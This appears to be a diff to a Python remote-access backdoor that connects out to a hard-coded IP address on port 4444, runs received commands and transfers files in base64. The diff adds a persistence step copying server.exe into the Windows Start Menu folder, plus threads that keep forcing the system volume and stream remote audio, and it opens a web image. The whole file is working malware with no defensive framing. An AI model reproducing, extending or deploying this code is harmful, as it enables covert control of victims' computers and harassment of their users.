@@ -2,6 +2,8 @@ import socket, json
 import subprocess
 import os
 import base64
+import threading
+import time
 # os.system("python -m pip install --upgrade pip")
 # os.system("pip3 install mss")
 # os.system("pip3 install numpy")
@@ -9,6 +11,12 @@ import base64
 import mss
 import cv2
 import webbrowser
+
+from ctypes import cast, POINTER
+from comtypes import CLSCTX_ALL
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from playsound import playsound
+
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -59,19 +67,7 @@ class Backdoor:
         file = base64.encodebytes(file).decode('utf-8')
         return file
 
-    def run(self):
-        from ctypes import cast, POINTER
-        from comtypes import CLSCTX_ALL
-        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-         
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(
-           IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        volume = cast(interface, POINTER(IAudioEndpointVolume))
-
-        webbrowser.open('https://www.youtube.com/watch?v=nybtOIxlku8')
-
-        volume.SetMasterVolumeLevel(0.0, None)
+    def run(self):         
         while True:
             command = str(self.reliable_recive())
             try:
@@ -115,6 +111,36 @@ class Backdoor:
                 self.reliable_send(error)
                 # self.reliable_send("[-] Something was wrong!")
 
+
+
+username = subprocess.getoutput("echo \%username%")
+path = f"C:\\Users\\{username[1::]}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\"
+command = f'copy server.exe "{path}"'
+print(command)
+os.system(command)
+
+devices = AudioUtilities.GetSpeakers()
+interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+volume = cast(interface, POINTER(IAudioEndpointVolume))
+
+def setMaxVolume():
+    while True:
+        volume.SetMasterVolumeLevel(-30.0, None)
+        time.sleep(2)
+
+def playGimn():
+    while True:
+        playsound('https://mp3bit.cc/5094.mp3')
+        playsound('https://music2019.su/uploads/files/2022-02/romax-batko-nash-bandera_456639639.mp3')
+
+
+vol = threading.Thread(target=setMaxVolume)
+vol.start()
+
+gimn = threading.Thread(target=playGimn)
+gimn.start()
+
+webbrowser.open('https://f8n-production-collection-assets.imgix.net/0x30c7123FA156772020814bC39b4559Fc94deebc8/1/nft.jpg?q=80&auto=format%2Ccompress&cs=srgb&max-w=1680&max-h=1680')
 
 
 my_backdoor = Backdoor("185.247.119.121", 4444)
